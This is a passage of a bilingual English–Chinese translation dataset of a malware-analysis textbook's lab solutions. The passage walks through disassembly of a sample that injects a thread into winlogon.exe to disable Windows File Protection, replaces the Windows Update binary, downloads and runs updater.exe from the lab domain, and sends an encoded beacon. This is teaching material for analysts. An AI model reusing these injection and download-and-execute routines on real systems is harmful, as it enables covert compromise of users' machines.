- en: 004011AF call ds:**GetProcAddress**
  id: totrans-4008
  prefs: []
  type: TYPE_NORMAL
  zh: 004011AF call ds:**GetProcAddress**
- en: 004011B5 mov **lpStartAddress**, eax 
  id: totrans-4009
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B5 mov **lpStartAddress**, eax 
- en: 004011BA mov eax, [ebp+dwProcessId]
  id: totrans-4010
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BA mov eax, [ebp+dwProcessId]
- en: 004011BD push eax ; dwProcessId
  id: totrans-4011
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BD push eax ; dwProcessId
- en: 004011BE push 0 ; bInheritHandle
  id: totrans-4012
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BE push 0 ; bInheritHandle
- en: 004011C0 push 1F0FFFh ; dwDesiredAccess
  id: totrans-4013
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 push 1F0FFFh ; dwDesiredAccess
- en: 004011C5 call ds:**OpenProcess**
  id: totrans-4014
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C5 call ds:**OpenProcess**
- en: 004011CB mov [ebp+hProcess], eax 
  id: totrans-4015
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CB mov [ebp+hProcess], eax 
- en: 004011CE cmp [ebp+hProcess], 0
  id: totrans-4016
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CE cmp [ebp+hProcess], 0
- en: 004011D2 jnz short loc_4011D
  id: totrans-4017
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D2 jnz short loc_4011D
- en: '*Listing 12-27L: Resolving ordinal 2 of sfc_os.dll and opening a handle to
    Winlogon* The code in Listing 12-28L calls CreateRemoteThread. Examining the arguments
    for CreateRemoteThread, we see that the hProcess parameter at  is EDX, our *winlogon.exe*
    handle. The lpStartAddress passed at  is a pointer to the function at *sfc_os.dll*
    at ordinal 2 that injects a thread into *winlogon.exe*.'
  id: totrans-4018
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-27L：解析 sfc_os.dll 的序号 2 并打开 Winlogon 的句柄* 列出 12-28L 中的代码调用 CreateRemoteThread。检查
    CreateRemoteThread 的参数，我们看到  处的 hProcess 参数是 EDX，我们的 *winlogon.exe* 句柄。传递给 
    的 lpStartAddress 是指向 *sfc_os.dll* 中序号 2 的函数的指针，该函数将线程注入到 *winlogon.exe* 中。'
- en: (Because *sfc_os.dll* is already loaded inside *winlogon.exe*, there is no need
    to load the DLL within the newly created remote thread, so we don’t have a call
    to WriteProcessMemory.) That thread is ordinal 2 of *sfc_os.dll*.
  id: totrans-4019
  prefs: []
  type: TYPE_NORMAL
  zh: （因为 *sfc_os.dll* 已经加载在 *winlogon.exe* 中，所以不需要在新建的远程线程中加载该 DLL，因此没有 WriteProcessMemory
    的调用。）该线程是 *sfc_os.dll* 的序号 2。
- en: 004011D8 push 0 ; lpThreadId
  id: totrans-4020
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D8 push 0 ; lpThreadId
- en: 004011DA push 0 ; dwCreationFlags
  id: totrans-4021
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DA push 0 ; dwCreationFlags
- en: Solutions to Labs
  id: totrans-4022
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**603**'
  id: totrans-4023
  prefs: []
  type: TYPE_NORMAL
  zh: '**603**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4024
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004011DC push 0 ; lpParameter 004011DE mov ecx, lpStartAddress 
  id: totrans-4025
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DC push 0 ; lpParameter 004011DE mov ecx, lpStartAddress 
- en: 004011E4 push ecx ; lpStartAddress
  id: totrans-4026
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E4 push ecx ; lpStartAddress
- en: 004011E5 push 0 ; dwStackSize
  id: totrans-4027
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E5 push 0 ; dwStackSize
- en: 004011E7 push 0 ; lpThreadAttributes 004011E9 mov edx, [ebp+hProcess]
  id: totrans-4028
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E7 push 0 ; lpThreadAttributes 004011E9 mov edx, [ebp+hProcess]
- en: 004011EC push edx ; hProcess 
  id: totrans-4029
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EC push edx ; hProcess 
- en: 004011ED call ds:**CreateRemoteThread**
  id: totrans-4030
  prefs: []
  type: TYPE_NORMAL
  zh: 004011ED call ds:**CreateRemoteThread**
- en: '*Listing 12-28L: Calling CreateRemoteThread for a remote process* But what
    are *sfc_os.dll* and export ordinal 2? The DLL *sfc_os.dll* is partially responsible
    for Windows File Protection, a series of threads running within *winlogon.exe*.
    Ordinal 2 of *sfc_os.dll* is an unnamed export known as SfcTerminateWatcherThread.'
  id: totrans-4031
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-28L：为远程进程调用 CreateRemoteThread* 但 *sfc_os.dll* 和导出序号 2 是什么？*sfc_os.dll*
    部分负责 Windows 文件保护，一系列在 *winlogon.exe* 中运行的线程。*sfc_os.dll* 的序号 2 是一个未命名的导出，称为 SfcTerminateWatcherThread。'
- en: '**NOTE**'
  id: totrans-4032
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*The information about* sfc_os.dll *and export ordinal 2 given here is undocumented.*'
  id: totrans-4033
  prefs: []
  type: TYPE_NORMAL
  zh: '*这里提供的关于 *sfc_os.dll* 和导出序号 2 的信息是未记录的。*'
- en: '*To avoid needing to reverse-engineer the Windows DLL, search the Internet
    for*'
  id: totrans-4034
  prefs: []
  type: TYPE_NORMAL
  zh: '*为了避免需要逆向工程 Windows DLL，请在互联网上搜索*'
- en: '*“sfc_os.dll ordinal 2” to see what information you can find.*'
  id: totrans-4035
  prefs: []
  type: TYPE_NORMAL
  zh: '*“sfc_os.dll 序号 2”以查看您可以找到的信息。*'
- en: SfcTerminateWatcherThread must run inside *winlogon.exe* in order to successfully
    execute. By forcing the SfcTerminateWatcherThread function to execute, the malware
    disables Windows File Protection until the next system reboot.
  id: totrans-4036
  prefs: []
  type: TYPE_NORMAL
  zh: SfcTerminateWatcherThread 必须在 *winlogon.exe* 中运行才能成功执行。通过强制 SfcTerminateWatcherThread
    函数执行，恶意软件将禁用 Windows 文件保护，直到下一次系统重启。
- en: If the thread is injected properly, the code in Listing 12-29L executes, building
    a string. When the code executes, GetWindowsDirectoryA at  returns a pointer
    to the current Windows directory (usually *C:\Windows*), and the malware passes
    this string and \system32\wupdmgr.exe to an _snprintf call, as shown at  and
    . This code will typically build the string "C:\Windows\ system32\wupdmgr.exe",
    which will be stored in ExistingFileName. *Wupdmgr.exe* is used for Windows updates
    under Windows XP.
  id: totrans-4037
  prefs: []
  type: TYPE_NORMAL
  zh: 如果线程正确注入，列出 12-29L 中的代码将执行，构建一个字符串。当代码执行时，GetWindowsDirectoryA 在 处返回当前 Windows
    目录的指针（通常是 *C:\Windows*），恶意软件将此字符串和 \system32\wupdmgr.exe 传递给一个 _snprintf 调用，如
    和  所示。此代码通常构建字符串 "C:\Windows\ system32\wupdmgr.exe"，该字符串将存储在 ExistingFileName
    中。*Wupdmgr.exe* 用于 Windows XP 下的 Windows 更新。
- en: 00401506 push 10Eh ; uSize
  id: totrans-4038
  prefs: []
  type: TYPE_NORMAL
  zh: 00401506 push 10Eh ; uSize
- en: 0040150B lea edx, [ebp+Buffer]
  id: totrans-4039
  prefs: []
  type: TYPE_NORMAL
  zh: 0040150B lea edx, [ebp+Buffer]
- en: 00401511 push edx ; lpBuffer
  id: totrans-4040
  prefs: []
  type: TYPE_NORMAL
  zh: 00401511 push edx ; lpBuffer
- en: 00401512 call ds:**GetWindowsDirectoryA** 
  id: totrans-4041
  prefs: []
  type: TYPE_NORMAL
  zh: 00401512 call ds:**GetWindowsDirectoryA** 
- en: 00401518 push offset aSystem32Wupdmg ; \\system32\\wupdmgr.exe 
  id: totrans-4042
  prefs: []
  type: TYPE_NORMAL
  zh: 00401518 push offset aSystem32Wupdmg ; \\system32\\wupdmgr.exe 
- en: 0040151D lea eax, [ebp+Buffer]
  id: totrans-4043
  prefs: []
  type: TYPE_NORMAL
  zh: 0040151D lea eax, [ebp+Buffer]
- en: 00401523 push eax 
  id: totrans-4044
  prefs: []
  type: TYPE_NORMAL
  zh: 00401523 push eax 
- en: 00401524 push offset aSS ; "%s%s"
  id: totrans-4045
  prefs: []
  type: TYPE_NORMAL
  zh: 00401524 push offset aSS ; "%s%s"
- en: 00401529 push 10Eh ; Count
  id: totrans-4046
  prefs: []
  type: TYPE_NORMAL
  zh: 00401529 push 10Eh ; Count
- en: 0040152E lea ecx, [ebp+**ExistingFileName**]
  id: totrans-4047
  prefs: []
  type: TYPE_NORMAL
  zh: 0040152E lea ecx, [ebp+**ExistingFileName**]
- en: 00401534 push ecx ; Dest
  id: totrans-4048
  prefs: []
  type: TYPE_NORMAL
  zh: 00401534 push ecx ; Dest
- en: 00401535 call ds:**_snprintf**
  id: totrans-4049
  prefs: []
  type: TYPE_NORMAL
  zh: 00401535 call ds:**_snprintf**
- en: '*Listing 12-29L: Building a string for the* wupdmgr.exe *path* In Listing 12-30L,
    we see another string being built. A call to GetTempPathA at  gives us a pointer
    to the current user’s temporary directory, usually *C:\* *Documents and Settings\<username>\Local\Temp*.
    The temporary directory path is then passed to another _snprintf call with the
    parameter \\winup.exe, as seen at  and , creating the string "C:\Documents and
    Settings\ *username*\ Local\Temp\winup.exe", which is stored in NewFileName.'
  id: totrans-4050
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-29L：构建 wupdmgr.exe 路径的字符串* 在列出 12-30L 中，我们看到另一个字符串正在构建。在 处的 GetTempPathA
    调用为我们提供了当前用户临时目录的指针，通常是 *C:\* *Documents and Settings\<username>\Local\Temp*。然后将临时目录路径传递给另一个
    _snprintf 调用，参数为 \\winup.exe，如 和  所见，创建字符串 "C:\Documents and Settings\ *username*\
    Local\Temp\winup.exe"，该字符串存储在 NewFileName 中。'
- en: '**604**'
  id: totrans-4051
  prefs: []
  type: TYPE_NORMAL
  zh: '**604**'
- en: Appendix C
  id: totrans-4052
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4053
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040153B add esp, 14h
  id: totrans-4054
  prefs: []
  type: TYPE_NORMAL
  zh: 0040153B add esp, 14h
- en: 0040153E lea edx, [ebp+var_110]
  id: totrans-4055
  prefs: []
  type: TYPE_NORMAL
  zh: 0040153E lea edx, [ebp+var_110]
- en: 00401544 push edx ; lpBuffer
  id: totrans-4056
  prefs: []
  type: TYPE_NORMAL
  zh: 00401544 push edx ; lpBuffer
- en: 00401545 push 10Eh ; nBufferLength
  id: totrans-4057
  prefs: []
  type: TYPE_NORMAL
  zh: 00401545 push 10Eh ; nBufferLength
- en: 0040154A call ds:**GetTempPathA** 
  id: totrans-4058
  prefs: []
  type: TYPE_NORMAL
  zh: 0040154A call ds:**GetTempPathA** 
- en: 00401550 push offset aWinup_exe ; \\winup.exe 
  id: totrans-4059
  prefs: []
  type: TYPE_NORMAL
  zh: 00401550 push offset aWinup_exe ; \\winup.exe 
- en: 00401555 lea eax, [ebp+var_110]
  id: totrans-4060
  prefs: []
  type: TYPE_NORMAL
  zh: 00401555 lea eax, [ebp+var_110]
- en: 0040155B push eax 
  id: totrans-4061
  prefs: []
  type: TYPE_NORMAL
  zh: 0040155B push eax 
- en: 0040155C push offset aSS_0 ; "%s%s"
  id: totrans-4062
  prefs: []
  type: TYPE_NORMAL
  zh: 0040155C push offset aSS_0 ; "%s%s"
- en: 00401561 push 10Eh ; Count
  id: totrans-4063
  prefs: []
  type: TYPE_NORMAL
  zh: 00401561 push 10Eh ; Count
- en: 00401566 lea ecx, [ebp+**NewFileName**]
  id: totrans-4064
  prefs: []
  type: TYPE_NORMAL
  zh: 00401566 lea ecx, [ebp+**NewFileName**]
- en: 0040156C push ecx ; Dest
  id: totrans-4065
  prefs: []
  type: TYPE_NORMAL
  zh: 0040156C push ecx ; Dest
- en: 0040156D call ds:**_snprintf**
  id: totrans-4066
  prefs: []
  type: TYPE_NORMAL
  zh: 0040156D call ds:**_snprintf**
- en: '*Listing 12-30L: Building a string for the* winup.exe *path* We can now see
    why IDA Pro renamed two local variables to NewFileName and ExistingFileName. These
    local variables are used in the MoveFileA call, as shown in Listing 12-31L at
    . The MoveFileA function will move the Windows Update binary to the user’s temporary
    directory.'
  id: totrans-4067
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-30L：构建 winup.exe 路径的字符串* 我们现在可以理解为什么 IDA Pro 将两个局部变量重命名为 NewFileName
    和 ExistingFileName。这些局部变量在 MoveFileA 调用中使用，如列出 12-31L 中的 所示。MoveFileA 函数将 Windows
    更新二进制文件移动到用户的临时目录。'
- en: 00401576 lea edx, [ebp+**NewFileName**]
  id: totrans-4068
  prefs: []
  type: TYPE_NORMAL
  zh: 00401576 lea edx, [ebp+**NewFileName**]
- en: 0040157C push edx ; lpNewFileName
  id: totrans-4069
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157C push edx ; lpNewFileName
- en: 0040157D lea eax, [ebp+**ExistingFileName**]
  id: totrans-4070
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157D lea eax, [ebp+**ExistingFileName**]
- en: 00401583 push eax ; lpExistingFileName **1 2**
  id: totrans-4071
  prefs: []
  type: TYPE_NORMAL
  zh: 00401583 push eax ; lpExistingFileName **1 2**
- en: 00401584 call ds:**MoveFileA** 
  id: totrans-4072
  prefs: []
  type: TYPE_NORMAL
  zh: 00401584 call ds:**MoveFileA** 
- en: '*Listing 12-31L: Moving the Windows Update binary to the temporary directory*
    In Listing 12-32L, we see the malware calling GetModuleHandleA at , which returns
    a module handle for the current process. We then see a series of resources section
    APIs, specifically, FindResourceA with parameters'
  id: totrans-4073
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-31L：将 Windows 更新二进制文件移动到临时目录* 在列出 12-32L 中，我们看到恶意软件在 处调用 GetModuleHandleA，它返回当前进程的模块句柄。然后我们看到一系列资源段
    API，特别是带有参数的 FindResourceA'
- en: '#101 and BIN. As we guessed as a result of our earlier basic analysis, the
    malware is extracting its resource section to disk.'
  id: totrans-4074
  prefs: []
  type: TYPE_NORMAL
  zh: '#101 和 BIN。正如我们根据早期基本分析所猜测的那样，恶意软件正在将其资源部分提取到磁盘上。'
- en: 004012A1 call ds:**GetModuleHandleA** 
  id: totrans-4075
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A1 call ds:**GetModuleHandleA** 
- en: 004012A7 mov [ebp+hModule], eax
  id: totrans-4076
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A7 mov [ebp+hModule], eax
- en: 004012AA push offset Type ; "BIN"
  id: totrans-4077
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AA push offset Type ; "BIN"
- en: 004012AF push offset Name ; "#101"
  id: totrans-4078
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AF push offset Name ; "#101"
- en: 004012B4 mov eax, [ebp+hModule]
  id: totrans-4079
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B4 mov eax, [ebp+hModule]
- en: 004012B7 push eax ; hModule
  id: totrans-4080
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B7 push eax ; hModule
- en: 004012B8 call ds:**FindResourceA**
  id: totrans-4081
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B8 call ds:**FindResourceA**
- en: '*Listing 12-32L: Resource extraction*'
  id: totrans-4082
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-32L：资源提取*'
- en: Later in this function, following the call to FindResourceA, are calls to LoadResource,
    SizeofResource, CreateFileA, and WriteFile (not shown here). This combination
    of function calls extracts the file from the resource section BIN
  id: totrans-4083
  prefs: []
  type: TYPE_NORMAL
  zh: 在此函数的后面，在 FindResourceA 调用之后，是 LoadResource、SizeofResource、CreateFileA 和 WriteFile（此处未显示）的调用。这个函数调用的组合从资源部分
    BIN 提取文件。
- en: and writes the file to *C:\Windows\System32\wupdmgr.exe*. The malware is creating
    a new Windows Update binary handler. Under normal circumstances, its attempt to
    create a new handler would fail because Windows File Protection Solutions to Labs
  id: totrans-4084
  prefs: []
  type: TYPE_NORMAL
  zh: 并将文件写入 *C:\Windows\System32\wupdmgr.exe*。恶意软件正在创建一个新的 Windows 更新二进制处理程序。在正常情况下，其创建新处理程序的尝试会失败，因为
    Windows 文件保护解决方案针对 Labs
- en: '**605**'
  id: totrans-4085
  prefs: []
  type: TYPE_NORMAL
  zh: '**605**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4086
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: would detect a change in the file and overwrite the newly created one, but because
    the malware disabled this functionality, it can overwrite normally protected Windows
    binaries.
  id: totrans-4087
  prefs: []
  type: TYPE_NORMAL
  zh: 会检测文件的变化并覆盖新创建的文件，但由于恶意软件禁用了此功能，它可以正常覆盖受保护的 Windows 可执行文件。
- en: The last thing this function does is launch the new *wupdmgr.exe* using WinExec.
    The function is launched with an uCmdShow parameter of 0, or SW_HIDE, as shown
    at  in Listing 12-33L, in order to hide the program window.
  id: totrans-4088
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数最后使用 WinExec 启动新的 *wupdmgr.exe*。该函数以 0 或 SW_HIDE 的 uCmdShow 参数启动，如列出 12-33L
    中的  所示，以隐藏程序窗口。
- en: 0040133C push 0  ;
  id: totrans-4089
  prefs: []
  type: TYPE_NORMAL
  zh: 0040133C push 0  ;
- en: uCmdShow
  id: totrans-4090
  prefs: []
  type: TYPE_NORMAL
  zh: uCmdShow
- en: 0040133E lea edx, [ebp+FileName]
  id: totrans-4091
  prefs: []
  type: TYPE_NORMAL
  zh: 0040133E lea edx, [ebp+FileName]
- en: 00401344 push edx ; lpCmdLine
  id: totrans-4092
  prefs: []
  type: TYPE_NORMAL
  zh: 00401344 push edx ; lpCmdLine
- en: 00401345 call ds:WinExec
  id: totrans-4093
  prefs: []
  type: TYPE_NORMAL
  zh: 00401345 call ds:WinExec
- en: '*Listing 12-33L: Launching the extracted file*'
  id: totrans-4094
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-33L：启动提取的文件*'
- en: Having completed our analysis of this binary, let’s examine the binary extracted
    from its resource section. To get the binary, run the malware and open the newly
    created *wupdmgr.exe* or use Resource Hacker to carve out the file.
  id: totrans-4095
  prefs: []
  type: TYPE_NORMAL
  zh: 在完成对这个二进制文件的分析后，让我们检查从其资源部分提取的二进制文件。要获取二进制文件，运行恶意软件并打开新创建的 *wupdmgr.exe* 或使用
    Resource Hacker 提取文件。
- en: After loading the malware into IDA Pro, we see a familiar subset of calls in
    the main function. The malware creates a string to our temporary move of the original
    Windows Update binary (C:\Documents and Settings\ *username*\ Local\Temp\winup.exe),
    and then runs the original Windows Update binary (using WinExec), which was saved
    to the user’s temporary directory. If the user were to perform a Windows Update,
    everything would appear to operate normally; the original Windows Update file
    would run.
  id: totrans-4096
  prefs: []
  type: TYPE_NORMAL
  zh: 在将恶意软件加载到 IDA Pro 后，我们在主函数中看到一组熟悉的调用。恶意软件创建了一个指向临时移动的原始 Windows 更新二进制文件（C:\Documents
    and Settings\ *username*\ Local\Temp\winup.exe）的字符串，然后运行原始的 Windows 更新二进制文件（使用
    WinExec），该文件已保存到用户的临时目录。如果用户执行 Windows 更新，一切看起来都会正常运行；原始的 Windows 更新文件将会运行。
- en: Next, in IDA Pro, we see construction of the string C:\Windows\system32\ wupdmgrd.exe
    beginning at 0x4010C3, to be stored in a local variable Dest.
  id: totrans-4097
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，在 IDA Pro 中，我们看到从 0x4010C3 开始构建字符串 C:\Windows\system32\ wupdmgrd.exe，并将其存储在局部变量
    Dest 中。
- en: Other than the *d* in the filename, this string is very close to the original
    Windows Update binary name.
  id: totrans-4098
  prefs: []
  type: TYPE_NORMAL
  zh: 除了文件名中的 *d* 之外，这个字符串与原始 Windows 更新二进制文件名非常相似。
- en: In Listing 12-34L, notice the API call to URLDownloadToFileA. This call takes
    some interesting parameters that deserve further inspection.
  id: totrans-4099
  prefs: []
  type: TYPE_NORMAL
  zh: 在列出 12-34L 中，注意对 URLDownloadToFileA 的 API 调用。这个调用有一些有趣的参数，值得进一步检查。
- en: 004010EF push 0 ; LPBINDSTATUSCALLBACK
  id: totrans-4100
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EF push 0 ; LPBINDSTATUSCALLBACK
- en: 004010F1 push 0 ; DWORD
  id: totrans-4101
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F1 push 0 ; DWORD
- en: 004010F3 lea ecx, [ebp+Dest] 
  id: totrans-4102
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F3 lea ecx, [ebp+Dest] 
- en: 004010F9 push ecx ; LPCSTR
  id: totrans-4103
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F9 push ecx ; LPCSTR
- en: 004010FA push offset aHttpWww_practi  ; "http://www.practicalmal..."
  id: totrans-4104
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FA push offset aHttpWww_practi  ; "http://www.practicalmal..."
- en: 004010FF push 0 ; LPUNKNOWN
  id: totrans-4105
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FF push 0 ; LPUNKNOWN
- en: 00401101 call **URLDownloadToFileA**
  id: totrans-4106
  prefs: []
  type: TYPE_NORMAL
  zh: 00401101 call **URLDownloadToFileA**
- en: '*Listing 12-34L: Analyzing the extracted and launched malware* The parameter
    at , szURL, is set to http://www.practicalmalwareanalysis'
  id: totrans-4107
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出12-34L：分析提取和启动的恶意软件*在处的参数szURL设置为http://www.practicalmalwareanalysis'
- en: .com/updater.exe. At , the szFileName parameter is set to Dest (C:\Windows\
    system32\wupdmgrd.exe). The malware is doing its own updating, downloading more
    malware! The downloaded *updater.exe* file will be saved to *wupdmgrd.exe*.
  id: totrans-4108
  prefs: []
  type: TYPE_NORMAL
  zh: .com/updater.exe。在处，szFileName参数设置为Dest（C:\Windows\system32\wupdmgrd.exe）。恶意软件正在执行自己的更新，下载更多的恶意软件！下载的*updater.exe*文件将被保存为*wupdmgrd.exe*。
- en: The malware compares the return value from URLDownloadToFileA with 0 to see
    if the function call failed. If the return value is not 0, the malware will execute
    the newly created file. The binary will then return and exit.
  id: totrans-4109
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将URLDownloadToFileA的返回值与0进行比较，以查看函数调用是否失败。如果返回值不为0，恶意软件将执行新创建的文件。然后二进制文件将返回并退出。
- en: '**606**'
  id: totrans-4110
  prefs: []
  type: TYPE_NORMAL
  zh: '**606**'
- en: Appendix C
  id: totrans-4111
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4112
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Our analysis of the malware in this lab has introduced a common way that malware
    alters Windows functionality by disabling Windows File Protection. The malware
    in this lab trojanized the Windows Update process and created its own malware
    update routine. Users with this malware on their machine would see normal functionality
    because the malware did not completely destroy the original Windows Update binary.
  id: totrans-4113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们对本次实验中恶意软件的分析介绍了一种常见的恶意软件通过禁用Windows文件保护来改变Windows功能的方法。本次实验中的恶意软件对Windows更新过程进行了木马化，并创建了其自己的恶意软件更新程序。拥有这种恶意软件的机器上的用户会看到正常的功能，因为恶意软件并没有完全破坏原始的Windows更新二进制文件。
- en: '**Lab 13-1 Solutions**'
  id: totrans-4114
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 13-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-4115
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-4116
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Two strings appear in the beacon that are not present in the malware.
  id: totrans-4117
  prefs: []
  type: TYPE_NORMAL
  zh: 信标中出现两个字符串，在恶意软件中不存在。
- en: (When the strings command is run, the strings are not output.) One is the domain,
    www.practicalmalwareanalysis.com. The other is the GET request path, which may
    look something like aG9zdG5hbWUtZm9v.
  id: totrans-4118
  prefs: []
  type: TYPE_NORMAL
  zh: （当运行strings命令时，字符串不会输出。）一个是域名，www.practicalmalwareanalysis.com。另一个是GET请求路径，可能看起来像aG9zdG5hbWUtZm9v。
- en: 2\.
  id: totrans-4119
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The xor instruction at 004011B8 leads to a single-byte XOR-encoding loop in
    sub_401190\.
  id: totrans-4120
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B8处的xor指令导致sub_401190中的单字节XOR编码循环。
- en: 3\.
  id: totrans-4121
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The single-byte XOR encoding uses the byte 0x3B. The raw data resource with
    index 101 is an XOR-encoded buffer that decodes to www.practicalmalwareanalysis.com.
  id: totrans-4122
  prefs: []
  type: TYPE_NORMAL
  zh: 单字节XOR编码使用字节0x3B。索引为101的原始数据资源是一个XOR编码的缓冲区，解码后为www.practicalmalwareanalysis.com。
- en: 4\.
  id: totrans-4123
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: 'The PEiD KANAL plug-in and the IDA Entropy Plugin can identify the use of the
    standard Base64 encoding string:'
  id: totrans-4124
  prefs: []
  type: TYPE_NORMAL
  zh: PEiD KANAL插件和IDA Entropy插件可以识别标准Base64编码字符串的使用：
- en: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
  id: totrans-4125
  prefs: []
  type: TYPE_NORMAL
  zh: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
- en: '**1 3**'
  id: totrans-4126
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: 5\.
  id: totrans-4127
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: Standard Base64 encoding is used to create the GET request string.
  id: totrans-4128
  prefs: []
  type: TYPE_NORMAL
  zh: 标准Base64编码用于创建GET请求字符串。
- en: 6\.
  id: totrans-4129
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The Base64 encoding function starts at 0x004010B1\.
  id: totrans-4130
  prefs: []
  type: TYPE_NORMAL
  zh: Base64编码函数从0x004010B1开始。
- en: 7\.
  id: totrans-4131
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: '*Lab13-01.exe* copies a maximum of 12 bytes from the hostname before Base64
    encoding it, which makes the GET request string a maximum of 16'
  id: totrans-4132
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab13-01.exe*在Base64编码之前从主机名中复制最多12个字节，这使得GET请求字符串最多为16个字节。'
- en: characters.
  id: totrans-4133
  prefs: []
  type: TYPE_NORMAL
  zh: 个字符。
- en: 8\.
  id: totrans-4134
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: Padding characters may be used if the hostname length is less than 12
  id: totrans-4135
  prefs: []
  type: TYPE_NORMAL
  zh: 如果主机名长度小于12，可以使用填充字符。
- en: bytes and not evenly divisible by 3\.
  id: totrans-4136
  prefs: []
  type: TYPE_NORMAL
  zh: 字节，并且不能被3整除。
- en: 9\.
  id: totrans-4137
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: '*Lab13-01.exe* sends a regular beacon with an encoded hostname until it receives
    a specific response. Then it quits.'
  id: totrans-4138
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab13-01.exe*发送一个编码的主机名的常规信标，直到接收到特定的响应。然后它退出。'
- en: '***Detailed Analysis***'
  id: totrans-4139
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Let’s start by running *Lab13-01.exe* and monitoring its behavior. If you have
    a listening server set up (running ApateDNS and INetSim), you will notice that
    the malware beacons to www.practicalmalwareanalysis.com, with content similar
    to what is shown in Listing 13-1L.
  id: totrans-4140
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从运行*Lab13-01.exe*并监控其行为开始。如果您已设置监听服务器（运行ApateDNS和INetSim），您将注意到恶意软件向www.practicalmalwareanalysis.com发送信标，内容类似于图13-1L所示。
- en: GET /**aG9zdG5hbWUtZm9v**/ HTTP/1.1
  id: totrans-4141
  prefs: []
  type: TYPE_NORMAL
  zh: GET /**aG9zdG5hbWUtZm9v**/ HTTP/1.1
- en: 'User-Agent: Mozilla/4.0'
  id: totrans-4142
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/4.0'
- en: 'Host: **www.practicalmalwareanalysis.com**'
  id: totrans-4143
  prefs: []
  type: TYPE_NORMAL
  zh: 'Host: **www.practicalmalwareanalysis.com**'
- en: '*Listing 13-1L:* Lab13-01.exe *’s beacon*'
  id: totrans-4144
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出13-1L:* Lab13-01.exe *的信标*'
- en: Solutions to Labs
  id: totrans-4145
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**607**'
  id: totrans-4146
  prefs: []
  type: TYPE_NORMAL
  zh: '**607**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4147
  prefs: []
